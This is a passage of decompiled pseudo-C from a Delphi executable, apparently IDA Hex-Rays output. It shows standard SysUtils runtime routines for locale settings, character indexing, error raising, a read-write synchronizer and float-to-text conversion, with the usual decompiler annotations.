//----- (00409D78) --------------------------------------------------------
int __usercall sub_409D78@<eax>(int a1@<eax>, int a2@<edx>)
{
  int i; // esi
  int v5; // eax

  i = 0;
  if ( a2 > 0 && a2 <= sub_403724(a1) )
  {
    i = a2;
    if ( LOBYTE(dword_41E5B0[0]) )
    {
      v5 = 1;
      for ( i = 0; a2 >= v5; ++i )
      {
        if ( _bittest(dword_41C104, *(unsigned __int8 *)(a1 + v5 - 1)) )
          ++v5;
        ++v5;
      }
    }
  }
  return i;
}
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00409DC8) --------------------------------------------------------
int __userpurge sub_409DC8@<eax>(int a1@<eax>, int a2@<edx>, int *a3@<ecx>, int *a4)
{
  int v5; // edi
  int v6; // edx
  int result; // eax

  v5 = sub_403724(a1);
  v6 = 1;
  for ( result = 1; v5 > result && v6 < a2; ++result )
  {
    ++v6;
    if ( _bittest(dword_41C104, *(unsigned __int8 *)(a1 + result - 1)) )
      ++result;
  }
  if ( v6 == a2 && v5 > result && _bittest(dword_41C104, *(unsigned __int8 *)(a1 + result - 1)) )
    ++result;
  *a3 = v6;
  *a4 = result;
  return result;
}

//----- (00409E3C) --------------------------------------------------------
__int64 __usercall Sysutils::CharToByteIndex@<edx:eax>(int a1@<edx>, int a2@<eax>)
{
  int v5; // eax
  __int64 v7[2]; // [esp+0h] [ebp-10h] BYREF

  LODWORD(v7[0]) = 0;
  if ( a1 > 0 && a1 <= sub_403724(a2) )
  {
    if ( a1 > 1 && LOBYTE(dword_41E5B0[0]) )
    {
      sub_409DC8(a2, a1 - 1, (int *)v7 + 1, (int *)v7);
      if ( a1 - 1 <= SHIDWORD(v7[0]) && (v5 = sub_403724(a2), v5 > SLODWORD(v7[0])) )
        ++LODWORD(v7[0]);
      else
        LODWORD(v7[0]) = 0;
    }
    else
    {
      LODWORD(v7[0]) = a1;
    }
  }
  return v7[0];
}
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00409EA0) --------------------------------------------------------
__int64 __usercall Sysutils::CharToByteLen@<edx:eax>(int a1@<edx>, int a2@<eax>)
{
  int v3; // ebx
  int v5; // eax
  __int64 v7[2]; // [esp+0h] [ebp-10h] BYREF

  v3 = a1;
  LODWORD(v7[0]) = 0;
  if ( a1 > 0 )
  {
    if ( a1 > sub_403724(a2) )
      v3 = sub_403724(a2);
    if ( LOBYTE(dword_41E5B0[0]) )
    {
      sub_409DC8(a2, v3, (int *)v7 + 1, (int *)v7);
      v5 = sub_403724(a2);
      if ( v5 < SLODWORD(v7[0]) )
        LODWORD(v7[0]) = sub_403724(a2);
    }
    else
    {
      LODWORD(v7[0]) = v3;
    }
  }
  return v7[0];
}
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00409F00) --------------------------------------------------------
_BYTE *__usercall Sysutils::AnsiStrRScan@<eax>(char a1@<dl>, unsigned __int8 *a2@<eax>)
{
  _BYTE *v4; // eax
  _BYTE *v5; // esi

  v4 = Sysutils::AnsiStrScan(a1, a2);
  v5 = v4;
  if ( a1 && v4 )
  {
    do
    {
      v5 = v4;
      v4 = Sysutils::AnsiStrScan(a1, v4 + 1);
    }
    while ( v4 );
  }
  return v5;
}

//----- (00409F28) --------------------------------------------------------
_BYTE *__usercall Sysutils::AnsiStrScan@<eax>(char a1@<dl>, unsigned __int8 *a2@<eax>)
{
  _BYTE *i; // edi
  char v6; // al
  bool v7; // cf
  char v8; // al

  for ( i = Sysutils::StrScan(a1, a2); i; i = Sysutils::StrScan(a1, i + 1) )
  {
    v6 = sub_409D38(a2, i - a2);
    v7 = v6 == 0;
    v8 = v6 - 1;
    if ( v7 )
      break;
    if ( !v8 )
      ++i;
  }
  return i;
}

//----- (00409F68) --------------------------------------------------------
char SysUtils::_16746()
{
  LCID v0; // eax
  int v1; // eax
  int i; // esi
  unsigned __int8 v3; // bl
  bool v4; // cf
  char v5; // bl
  char v6; // bl
  BYTE v8; // [esp+0h] [ebp-4h]
  struct _cpinfo CPInfo; // [esp+4h] [ebp+0h] BYREF

  unk_41E5A8 = 1033;
  *((_WORD *)&unk_41E5A8 + 2) = 9;
  *((_WORD *)&unk_41E5A8 + 3) = 1;
  v0 = GetThreadLocale_0();
  if ( v0 )
    unk_41E5A8 = v0;
  if ( (_WORD)v0 )
  {
    *((_WORD *)&unk_41E5A8 + 2) = v0 & 0x3FF;
    *((_WORD *)&unk_41E5A8 + 3) = (unsigned __int16)v0 >> 10;
  }
  *((_BYTE *)&unk_41E5A8 + 9) = GetSystemMetrics(74) != 0;
  v1 = GetSystemMetrics(42);
  *((_BYTE *)&unk_41E5A8 + 8) = v1 != 0;
  if ( v1 )
  {
    LOBYTE(v1) = GetCPInfo(0, &CPInfo);
    for ( i = 0; i < 12; i += 2 )
    {
      LOBYTE(v1) = CPInfo.LeadByte[i + 1] | CPInfo.LeadByte[i];
      if ( !(_BYTE)v1 )
        break;
      LOBYTE(v1) = CPInfo.LeadByte[i];
      v3 = CPInfo.LeadByte[i + 1];
      v4 = v3 < (unsigned __int8)v1;
      v5 = v3 - v1;
      if ( !v4 )
      {
        v6 = v5 + 1;
        v8 = CPInfo.LeadByte[i];
        do
        {
          LOBYTE(v1) = v8;
          _bittestandset(dword_41C104, v8++);
          --v6;
        }
        while ( v6 );
      }
    }
  }
  return v1;
}

//----- (0040A020) --------------------------------------------------------
void __usercall Sysutils::GetFormatSettings(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  LCID v3; // ebx
  char *v4; // ecx
  char *v5; // ecx
  LCID v6; // ecx
  LCID v7; // ecx
  char *v8; // ecx
  LCID v9; // ecx
  LCID v10; // ecx
  LStr *v11; // ecx
  LStr *v12; // ecx
  char *v13; // ecx
  char *v14; // ecx
  char *v15; // ecx
  LCID v16; // ecx
  LStr *v17; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v18; // [esp-Ch] [ebp-50h] BYREF
  void *v19; // [esp-8h] [ebp-4Ch]
  int *v20; // [esp-4h] [ebp-48h]
  LStr *v21; // [esp+0h] [ebp-44h]
  int v22; // [esp+4h] [ebp-40h] BYREF
  int v23; // [esp+8h] [ebp-3Ch] BYREF
  int v24; // [esp+Ch] [ebp-38h] BYREF
  char *v25; // [esp+10h] [ebp-34h] BYREF
  char *v26; // [esp+14h] [ebp-30h] BYREF
  char *v27; // [esp+18h] [ebp-2Ch] BYREF
  BYTE *v28; // [esp+1Ch] [ebp-28h] BYREF
  char *v29; // [esp+20h] [ebp-24h] BYREF
  BYTE *v30; // [esp+24h] [ebp-20h] BYREF
  int v31; // [esp+28h] [ebp-1Ch] BYREF
  int v32; // [esp+2Ch] [ebp-18h] BYREF
  int v33; // [esp+30h] [ebp-14h] BYREF
  char *v34; // [esp+34h] [ebp-10h] BYREF
  char *v35; // [esp+38h] [ebp-Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v36; // [esp+3Ch] [ebp-8h] BYREF
  char *v37; // [esp+40h] [ebp-4h] BYREF
  int savedregs; // [esp+44h] [ebp+0h] BYREF

  v20 = &savedregs;
  v19 = &loc_40A2EB;
  v18 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v18);
  SysUtils::_16746();
  SysUtils::_16680_0(a1, a2, a3);
  if ( LOBYTE(dword_41E5B0[0]) )
    Sysutils::_16951();
  v3 = GetThreadLocale_0();
  Sysutils::GetLocaleStr(0, 0x14u, v3, (const int)&v34);
  __linkproc__ LStrAsg((char **)&dword_41E4E8, v34);
  Sysutils::GetLocaleStr((LCID)dword_40A300, 0x1Bu, v3, (const int)&v33);
  byte_41E4EC = sub_407058(v33, 0, v4);
  Sysutils::GetLocaleStr((LCID)dword_40A300, 0x1Cu, v3, (const int)&v32);
  byte_41E4ED = sub_407058(v32, 0, v5);
  LOBYTE(v6) = 44;
  byte_41E4EE = Sysutils::GetLocaleChar(v6, 0xFu, v3);
  LOBYTE(v7) = 46;
  byte_41E4EF = Sysutils::GetLocaleChar(v7, 0xEu, v3);
  Sysutils::GetLocaleStr((LCID)dword_40A300, 0x19u, v3, (const int)&v31);
  byte_41E4F0 = sub_407058(v31, 0, v8);
  LOBYTE(v9) = 47;
  byte_41E4F1 = Sysutils::GetLocaleChar(v9, 0x1Du, v3);
  Sysutils::GetLocaleStr((LCID)"m/d/yy", 0x1Fu, v3, (const int)&v29);
  SysUtils::_16684(v29, &v30, v3, a2, a3);
  __linkproc__ LStrAsg((char **)&dword_41E4F4, (char *)v30);
  Sysutils::GetLocaleStr((LCID)"mmmm d, yyyy", 0x20u, v3, (const int)&v27);
  SysUtils::_16684(v27, &v28, v3, a2, a3);
  __linkproc__ LStrAsg((char **)&dword_41E4F8, (char *)v28);
  LOBYTE(v10) = 58;
  byte_41E4FC = Sysutils::GetLocaleChar(v10, 0x1Eu, v3);
  Sysutils::GetLocaleStr((LCID)dword_40A334, 0x28u, v3, (const int)&v26);
  __linkproc__ LStrAsg((char **)&dword_41E500, v26);
  Sysutils::GetLocaleStr((LCID)dword_40A340, 0x29u, v3, (const int)&v25);
  __linkproc__ LStrAsg((char **)&dword_41E504, v25);
  System::__linkproc__ LStrClr(v11);
  System::__linkproc__ LStrClr(v12);
  Sysutils::GetLocaleStr((LCID)dword_40A300, 0x25u, v3, (const int)&v24);
  if ( sub_407058(v24, 0, v13) )
    __linkproc__ LStrLAsg(&v37, (char *)dword_40A358);
  else
    __linkproc__ LStrLAsg(&v37, (char *)dword_40A34C);
  Sysutils::GetLocaleStr((LCID)dword_40A300, 0x23u, v3, (const int)&v23);
  if ( !sub_407058(v23, 0, v14) )
  {
    Sysutils::GetLocaleStr((LCID)dword_40A300, 0x1005u, v3, (const int)&v22);
    if ( sub_407058(v22, 0, v15) )
      __linkproc__ LStrLAsg((char **)&v36, "AMPM ");
    else
      __linkproc__ LStrLAsg(&v35, " AMPM");
  }
  System::__linkproc__ LStrCatN((char **)&dword_41E508, 4);
  v18 = v36;
  System::__linkproc__ LStrCatN((char **)dword_41E50C, 4);
  LOBYTE(v16) = 44;
  byte_41E5EC = Sysutils::GetLocaleChar(v16, 0xCu, v3);
  v17 = v21;
  __writefsdword(0, (unsigned int)v19);
  v21 = (LStr *)&loc_40A2F2;
  System::__linkproc__ LStrArrayClr(v17, 16);
}
// 40A096: variable 'v4' is possibly undefined
// 40A0BA: variable 'v5' is possibly undefined
// 40A0CD: variable 'v6' is possibly undefined
// 40A0E0: variable 'v7' is possibly undefined
// 40A104: variable 'v8' is possibly undefined
// 40A117: variable 'v9' is possibly undefined
// 40A184: variable 'v10' is possibly undefined
// 40A1D5: variable 'v11' is possibly undefined
// 40A1DD: variable 'v12' is possibly undefined
// 40A1FC: variable 'v13' is possibly undefined
// 40A23B: variable 'v14' is possibly undefined
// 40A25E: variable 'v15' is possibly undefined
// 40A2C6: variable 'v16' is possibly undefined
// 40A300: using guessed type int dword_40A300[3];
// 40A334: using guessed type int dword_40A334[3];
// 40A340: using guessed type int dword_40A340[3];
// 40A34C: using guessed type int dword_40A34C[3];
// 40A358: using guessed type int dword_40A358[3];
// 41E4E8: using guessed type int dword_41E4E8;
// 41E4EC: using guessed type char byte_41E4EC;
// 41E4ED: using guessed type char byte_41E4ED;
// 41E4EE: using guessed type char byte_41E4EE;
// 41E4EF: using guessed type char byte_41E4EF;
// 41E4F0: using guessed type char byte_41E4F0;
// 41E4F1: using guessed type char byte_41E4F1;
// 41E4F4: using guessed type int dword_41E4F4;
// 41E4F8: using guessed type int dword_41E4F8;
// 41E4FC: using guessed type char byte_41E4FC;
// 41E500: using guessed type int dword_41E500;
// 41E504: using guessed type int dword_41E504;
// 41E508: using guessed type int dword_41E508;
// 41E50C: using guessed type int dword_41E50C[];
// 41E5B0: using guessed type int dword_41E5B0[];
// 41E5EC: using guessed type char byte_41E5EC;

//----- (0040A398) --------------------------------------------------------
void __cdecl Sysutils::RaiseLastWin32Error()
{
  BYTE *v0; // eax
  void *v1; // edx
  BYTE *v2; // ebx
  void *v3; // edx
  int v4; // eax
  LStr *v5; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v6; // [esp-Ch] [ebp-24h] BYREF
  DWORD v7; // [esp-8h] [ebp-20h]
  int *v8; // [esp-4h] [ebp-1Ch]
  const ULONG_PTR *v9; // [esp+0h] [ebp-18h]
  BYTE *v10[2]; // [esp+4h] [ebp-14h] BYREF
  LStr *v11; // [esp+Ch] [ebp-Ch]
  BYTE *v12; // [esp+10h] [ebp-8h]
  char v13; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10[0] = 0;
  v8 = &savedregs;
  v7 = (DWORD)&loc_40A422;
  v6 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v6);
  v0 = (BYTE *)GetLastError_0();
  v2 = v0;
  if ( v0 )
  {
    v10[1] = v0;
    LOBYTE(v11) = 0;
    SysErrorMessage((DWORD)v0, v10);
    v12 = v10[0];
    v13 = 11;
    LOBYTE(v3) = 1;
    Sysutils::Exception::Exception(dword_406B80, v3, off_41DAE8[0]);
  }
  else
  {
    LOBYTE(v1) = 1;
    Exception_CreateRes_0(dword_406B80, v1);
  }
  *(_DWORD *)(v4 + 12) = v2;
  sub_402F98((DWORD)v6, v7, (DWORD)v8, v9);
  v5 = v11;
  __writefsdword(0, (unsigned int)v10[0]);
  v11 = (LStr *)&loc_40A429;
  System::__linkproc__ LStrClr(v5);
}
// 40A3EB: variable 'v3' is possibly undefined
// 40A3FF: variable 'v1' is possibly undefined
// 40A404: variable 'v4' is possibly undefined
// 406B80: using guessed type int dword_406B80[3];
// 41DAE8: using guessed type int **off_41DAE8[7];

//----- (0040A430) --------------------------------------------------------
int __usercall sub_40A430@<eax>(int a1@<eax>)
{
  if ( !a1 )
    Sysutils::RaiseLastWin32Error();
  return a1;
}

//----- (0040A440) --------------------------------------------------------
int sub_40A440()
{
  int v0; // eax
  int result; // eax

  while ( dword_41C2E0 )
  {
    v0 = (int)dword_41C2E0;
    dword_41C2E0 = (_DWORD *)*dword_41C2E0;
    result = sub_4025B0(v0);
  }
  return result;
}

//----- (0040A460) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
HMODULE SysUtils::_16779()
{
  HMODULE result; // eax

  result = GetModuleHandleA_1("kernel32.dll");
  if ( result )
  {
    result = (HMODULE)GetProcAddress_0(result, "GetDiskFreeSpaceExA");
    dword_41C128 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))result;
  }
  if ( !dword_41C128 )
  {
    result = (HMODULE)System::Sysutils::_16913;
    dword_41C128 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))System::Sysutils::_16913;
  }
  return result;
}
// 41C128: using guessed type int (__stdcall *dword_41C128)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040A4BC) --------------------------------------------------------
char *__usercall TMultiReadExclusiveWriteSynchronizer__bctr@<eax>(char *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  char *v3; // esi
  char v5; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = (char *)System::__linkproc__ ClassCreate((int)a1, a2, v5);
  v2 = a2;
  v3 = a1;
  TObject_Create(a1);
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(v3 + 4));
  *((_DWORD *)v3 + 7) = CreateEventA(0, -1, -1, 0);
  sub_4045A0((int *)v3 + 10, (int)&unk_406BFC, 1, 4);
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 40A4C5: variable 'v5' is possibly undefined
// 40A4CA: variable 'a2' is possibly undefined

//----- (0040A524) --------------------------------------------------------
void __usercall Sysutils::TMultiReadExclusiveWriteSynchronizer::~TMultiReadExclusiveWriteSynchronizer(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v3; // eax
  char v4; // dl
  char v5; // bl
  _DWORD *v6; // esi

  v3 = sub_402D3C(a1, a2);
  v5 = v4;
  v6 = v3;
  Sysutils::TMultiReadExclusiveWriteSynchronizer::BeginWrite((int)v3);
  sub_402BCC(v6, v5 & 0xFC);
  CloseHandle_0((HANDLE)v6[7]);
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v6 + 1));
  if ( v5 > 0 )
    sub_402D2C(v6);
}
// 40A52B: variable 'v4' is possibly undefined

//----- (0040A564) --------------------------------------------------------
bool __usercall TMultiReadExclusiveWriteSynchronizer::WriterIsOnlyReader@<al>(int a1@<eax>)
{
  bool result; // al
  int v3; // ebx
  int v4; // edx
  int v5; // eax

  result = 0;
  if ( *(_DWORD *)(a1 + 44) )
  {
    v3 = 0;
    v4 = sub_4043EC(*(_DWORD *)(a1 + 40));
    while ( v4 > v3 )
    {
      v5 = *(_DWORD *)(*(_DWORD *)(a1 + 40) + 8 * v3);
      if ( v5 )
      {
        if ( v5 != *(_DWORD *)(a1 + 44) )
          break;
      }
      ++v3;
    }
    result = v4 <= v3;
  }
  return result;
}

//----- (0040A5A0) --------------------------------------------------------
void __usercall Sysutils::TMultiReadExclusiveWriteSynchronizer::BeginWrite(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 4));
  if ( !*(_BYTE *)(a1 + 52) )
  {
    *(_DWORD *)(a1 + 44) = GetCurrentThreadId_0();
    if ( !TMultiReadExclusiveWriteSynchronizer::WriterIsOnlyReader(a1) )
      WaitForSingleObject(*(HANDLE *)(a1 + 28), 0xFFFFFFFF);
    *(_DWORD *)(a1 + 36) = *(_DWORD *)(a1 + 32);
    *(_DWORD *)(a1 + 32) = 0;
    *(_DWORD *)(a1 + 44) = 0;
    *(_BYTE *)(a1 + 52) = 1;
  }
  ++*(_DWORD *)(a1 + 32);
}

//----- (0040A5EC) --------------------------------------------------------
_DWORD *__usercall sub_40A5EC@<eax>(_DWORD **a1@<eax>)
{
  _DWORD *v1; // edx

  v1 = *a1;
  *a1 = 0;
  return sub_402BDC(v1);
}

//----- (0040A8E8) --------------------------------------------------------
int __userpurge sub_40A8E8@<eax>(_BYTE *eax0@<eax>, int edx0@<edx>, char cl0@<cl>, int a1, int a2, char a3)
{
  return FLOATTOTEXT(eax0, edx0, cl0, a1, a2, a3);
}

//----- (0040A8EE) --------------------------------------------------------
int __userpurge FLOATTOTEXT@<eax>(_BYTE *a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5, unsigned __int8 a6)
{
  int v6; // eax
  int v7; // eax
  _BYTE *v8; // edi
  int v9; // ecx
  int v10; // ebx
  int v12; // [esp-4h] [ebp-2Ch]
  unsigned __int16 v13; // [esp+Ch] [ebp-1Ch] BYREF
  char v14[21]; // [esp+Fh] [ebp-19h] BYREF
  _BYTE *v15; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF
  int v17; // [esp+34h] [ebp+Ch]

  v15 = a1;
  v6 = 19;
  if ( !a3 )
  {
    v6 = a5;
    if ( a5 < 2 )
      v6 = 2;
    if ( v6 > 18 )
      v6 = 18;
  }
  v17 = v6;
  v12 = v6;
  v7 = 9999;
  if ( a6 >= 2u )
    v7 = a4;
  FLOATTODECIMAL((int)&v13, a2, a3, v7, v12);
  v8 = v15;
  if ( (unsigned int)v13 - 0x7FFF >= 2 )
  {
    v10 = a6;
    if ( a6 != 1 && (a6 > 4u || (__int16)v13 > v17) )
      LOBYTE(v10) = 0;
    ((void (__usercall *)(int@<ebp>, _BYTE *@<edi>, char *@<esi>))funcs_40A97A[v10])((int)&savedregs, v15, v14);
  }
  else
  {
    sub_40A9AC((int)&savedregs, v15);
    qmemcpy(v8, (char *)sub_40A8E8 + 3 * v9, 3u);
    v8 += 3;
  }
  return v8 - v15;
}
// 40A94E: variable 'v9' is possibly undefined
// 40A98F: using guessed type int (*funcs_40A97A[5])();

//----- (0040A9A3) --------------------------------------------------------
char __usercall sub_40A9A3@<al>(char *a1@<esi>)
{
  char result; // al

  result = *a1;
  if ( !*a1 )
    result = 48;
  return result;
}

//----- (0040A9AC) --------------------------------------------------------
char __usercall sub_40A9AC@<al>(int a1@<ebp>, _BYTE *a2@<edi>)
{
  char result; // al

  if ( *(_BYTE *)(a1 - 26) )
  {
    result = 45;
    *a2 = 45;
  }
  return result;
}

//----- (0040A9B6) --------------------------------------------------------
char __usercall sub_40A9B6@<al>(int a1@<ebp>, _BYTE *a2@<edi>, char *a3@<esi>)
{
  signed int v3; // ecx
  int v4; // edx
  char result; // al
  _BYTE *v6; // edi
  char *v7; // edi
  unsigned int v8; // ecx
  char *v9; // edi
  char v10; // al
  __int16 v11; // ax

  sub_40A9AC(a1, a2);
  v3 = *(__int16 *)(a1 - 28);
  v4 = 0;
  if ( v3 > *(_DWORD *)(a1 + 12) || v3 < -3 )
  {
    v3 = 1;
    v4 = 1;
    do
    {
LABEL_7:
      v10 = *a3++;
      if ( !v10 )
      {
        result = 48;
        memset(a2, 48, v3);
        goto LABEL_14;
      }
      *a2++ = v10;
      --v3;
    }
    while ( v3 );
    result = *a3++;
    if ( !result )
      goto LABEL_14;
    HIBYTE(v11) = result;
    LOBYTE(v11) = byte_41E4EF;
    *(_WORD *)a2 = v11;
    v9 = a2 + 2;
  }
  else
  {
    if ( v3 > 0 )
      goto LABEL_7;
    result = 48;
    *a2 = 48;
    v6 = a2 + 1;
    if ( !*a3 )
      return result;
    *v6 = byte_41E4EF;
    v7 = v6 + 1;
    v8 = -v3;
    memset(v7, 48, v8);
    v9 = &v7[v8];
  }
  while ( 1 )
  {
    result = *a3++;
    if ( !result )
      break;
    *v9++ = result;
  }
LABEL_14:
  if ( v4 )
    JUMPOUT(0x40AA42);
  return result;
}
// 40AA15: control flows out of bounds to 40AA42
// 41E4EF: using guessed type char byte_41E4EF;

//----- (0040AA18) --------------------------------------------------------
int __usercall sub_40AA18@<eax>(int a1@<ebp>, _BYTE *a2@<edi>, char *a3@<esi>)
{
  __int16 v3; // ax
  char *v4; // edi
  int v5; // ecx
  __int16 v6; // ax
  unsigned int v7; // ecx

  sub_40A9AC(a1, a2);
  LOBYTE(v3) = sub_40A9A3(a3);
  HIBYTE(v3) = byte_41E4EF;
  *(_WORD *)a2 = v3;
  v4 = a2 + 2;
  do
    *v4++ = sub_40A9A3(a3);
  while ( v5 != 1 );
  HIBYTE(v6) = 43;
  v7 = *(_DWORD *)(a1 + 8);
  if ( v7 >= 4 )
    v7 = 0;
  LOBYTE(v6) = 69;
  return sub_40AA4C(v6, *(__int16 *)(a1 - 28) - 1, v7, *(_BYTE *)(a1 - 25), v4);
}
// 40AA34: variable 'v5' is possibly undefined
// 41E4EF: using guessed type char byte_41E4EF;

//----- (0040AA4C) --------------------------------------------------------
int __usercall sub_40AA4C@<eax>(__int16 a1@<ax>, int a2@<edx>, int a3@<ecx>, char a4@<bl>, _BYTE *a5@<edi>)
{
  char *v5; // edi
  char v6; // al
  unsigned int v7; // eax
  int *v8; // ebx
  unsigned int v9; // et2
  int v11; // [esp-4h] [ebp-4h] BYREF

  *a5 = a1;
  v5 = a5 + 1;
  if ( a4 )
  {
    if ( a2 < 0 )
    {
      v6 = 45;
      a2 = -a2;
LABEL_7:
      *v5++ = v6;
      goto LABEL_8;
    }
  }
  else
  {
    a2 = 0;
  }
  if ( HIBYTE(a1) )
  {
    v6 = HIBYTE(a1);
    goto LABEL_7;
  }
LABEL_8:
  v7 = a2;
  v11 = a2;
  v8 = &v11;
  do
  {
    do
    {
      v9 = v7 % 0xA;
      v7 /= 0xAu;
      *(_BYTE *)v8 = v9 + 48;
      v8 = (int *)((char *)v8 + 1);
      --a3;
    }
    while ( v7 );
  }
  while ( a3 > 0 );
  do
  {
    v8 = (int *)((char *)v8 - 1);
    *v5++ = *(_BYTE *)v8;
  }
  while ( v8 != &v11 );
  return v11;
}

//----- (0040AA90) --------------------------------------------------------
char __usercall sub_40AA90@<al>(int a1@<ebp>, char *a2@<edi>, char *a3@<esi>)
{
  unsigned int v3; // edx
  int v4; // ecx
  char result; // al
  int v6; // ebx
  int v7; // ecx
  char *v8; // edi
  int v9; // edx

  v3 = *(_DWORD *)(a1 + 8);
  if ( v3 >= 0x12 )
    v3 = 18;
  v4 = *(__int16 *)(a1 - 28);
  if ( v4 > 0 )
  {
    v6 = 0;
    if ( *(_BYTE *)(a1 + 16) != 2 )
    {
      LOBYTE(v6) = (unsigned __int16)(v4 - 1) % 3u;
      ++v6;
    }
    while ( 1 )
    {
      result = sub_40A9A3(a3);
      *a2++ = result;
      v4 = v7 - 1;
      if ( !v4 )
        break;
      if ( !--v6 )
      {
        *a2++ = byte_41E4EE;
        v6 = 3;
      }
    }
  }
  else
  {
    result = 48;
    *a2++ = 48;
  }
  if ( v3 )
  {
    *a2 = byte_41E4EF;
    v8 = a2 + 1;
    if ( v4 )
    {
      result = 48;
      while ( 1 )
      {
        *v8++ = 48;
        if ( !--v3 )
          break;
        if ( !++v4 )
          goto LABEL_15;
      }
    }
    else
    {
      do
      {
LABEL_15:
        result = sub_40A9A3(a3);
        *v8++ = result;
      }
      while ( v9 != 1 );
    }
  }
  return result;
}
// 40AAC2: variable 'v7' is possibly undefined
// 40AAD4: variable 'v3' is possibly undefined
// 40AAEE: variable 'v9' is possibly undefined
// 41E4EE: using guessed type char byte_41E4EE;
// 41E4EF: using guessed type char byte_41E4EF;

//----- (0040AAF1) --------------------------------------------------------
void __usercall sub_40AAF1(int a1@<ebp>, _BYTE *a2@<edi>, char *a3@<esi>)
{
  int v3; // ebx
  __int16 v4; // cx
  char *v5; // ebx
  int v6; // ecx
  char v7; // al
  int v8; // [esp-4h] [ebp-4h]

  v3 = (unsigned __int8)byte_41E4EC;
  v4 = 3;
  if ( *(_BYTE *)(a1 - 26) )
  {
    LOBYTE(v3) = byte_41E4ED;
    v4 = 1039;
  }
  if ( (unsigned __int8)v3 > (unsigned __int8)v4 )
    LOBYTE(v3) = v4;
  LOBYTE(v3) = HIBYTE(v4) + v3;
  v5 = (char *)sub_40AB5A + 5 * v3;
  v6 = 5;
  do
  {
    v7 = *v5;
    if ( *v5 == 64 )
      break;
    v8 = v6;
    if ( v7 == 36 )
    {
      sub_40AB48(a2);
    }
    else if ( v7 == 42 )
    {
      sub_40AA90(a1, a2, a3);
    }
    else
    {
      *a2++ = v7;
    }
    ++v5;
    v6 = v8 - 1;
  }
  while ( v8 != 1 );
}
// 41E4EC: using guessed type char byte_41E4EC;
// 41E4ED: using guessed type char byte_41E4ED;

//----- (0040AB48) --------------------------------------------------------
void __usercall sub_40AB48(void *a1@<edi>)
{
  if ( dword_41E4E8 )
    qmemcpy(a1, (const void *)dword_41E4E8, *(_DWORD *)(dword_41E4E8 - 4));
}
// 41E4E8: using guessed type int dword_41E4E8;

//----- (0040AB5A) --------------------------------------------------------
_BYTE *__userpurge sub_40AB5A@<eax>(int a1@<eax>, int a2@<edx>, _BYTE *a3@<ecx>, int a4@<ebp>, char *a5@<esi>, int a6)
{
  int v6; // eax
  char v8; // bl
  int v9; // ecx
  char v10; // zf
  int v11; // eax
  int v12; // edx
  __int16 v14; // [esp-44h] [ebp-44h] BYREF
  char v15; // [esp-41h] [ebp-41h]
  int v16; // [esp-1Ch] [ebp-1Ch]
  int v17; // [esp-18h] [ebp-18h]
  char *v18; // [esp-14h] [ebp-14h]
  char v19; // [esp-10h] [ebp-10h]
  _BYTE *v20; // [esp-8h] [ebp-8h]
  int v21; // [esp-4h] [ebp-4h] BYREF

  LOBYTE(a1) = a1 & 0x2A;
  v6 = a1 + 3;
  BYTE1(v6) -= *(_BYTE *)(3 * v6);
  v6 += 2;
  LOBYTE(v6) = v6 & 0x20;
  LOBYTE(v6) = v6 - *(_BYTE *)(v6 + 64);
  BYTE1(v6) -= *(_BYTE *)v6;
  LOBYTE(v6) = v6 & 0x40;
  ++v6;
  *(_BYTE *)(a2 + a4) -= BYTE1(v6);
  *(_DWORD *)(v6 + 45) -= v6;
  LOBYTE(v6) = v6 & 0x2A;
  v6 += 2;
  LOBYTE(v6) = v6 & 0x2D;
  LOBYTE(v6) = (v6 - *(_BYTE *)(v6 + 64)) & 0x2A;
  v6 -= 707280960;
  LOBYTE(v6) = v6 & 0x29;
  v6 -= 1077945385;
  LOBYTE(v6) = v6 & 0x2D;
  v6 += 2142355380;
  BYTE1(v6) -= *(_BYTE *)v6;
  LOBYTE(v6) = v6 & 0x2D;
  ++v6;
  LOBYTE(v6) = v6 & 0x20;
  BYTE1(a3) = BYTE1(a3) - MEMORY[0x2A404024] - MEMORY[0x2D202440];
  LOBYTE(v6) = v6 - *(_BYTE *)(v6 + 42);
  v6 -= 675292192;
  LOBYTE(v6) = v6 & 0x20;
  BYTE1(a3) -= *a3;
  *(_BYTE *)a2 -= BYTE1(a3);
  a3[a4] &= BYTE1(v6);
  v21 = a4;
  v20 = (_BYTE *)v6;
  v8 = (char)a3;
  v9 = 2;
  if ( v8 )
  {
    if ( *(_QWORD *)a2 )
      v9 = *(_DWORD *)(a2 + 4) >> 31;
  }
  else if ( *(_DWORD *)(a2 + 4) | *(_DWORD *)a2 | *(unsigned __int16 *)(a2 + 8) )
  {
    v9 = *(unsigned __int16 *)(a2 + 8) >> 15;
  }
  sub_40AC8A(v9, (int)&v21);
  if ( v10 )
    return (_BYTE *)FLOATTOTEXT(v20, a2, v8, 0, 15, 0);
  sub_40ACC5((int)&v21, a5);
  v11 = v17;
  v12 = 9999;
  if ( !v19 )
  {
    v12 = v17 - v16;
    v11 = 18;
  }
  FLOATTODECIMAL((int)&v14, a2, v8, v12, v11);
  if ( v14 == (__int16)0x8000 || v14 == 0x7FFF || !v8 && v14 > 18 && !v19 )
    return (_BYTE *)FLOATTOTEXT(v20, a2, v8, 0, 15, 0);
  if ( !v15 )
  {
    sub_40AC8A(2, (int)&v21);
    if ( v10 )
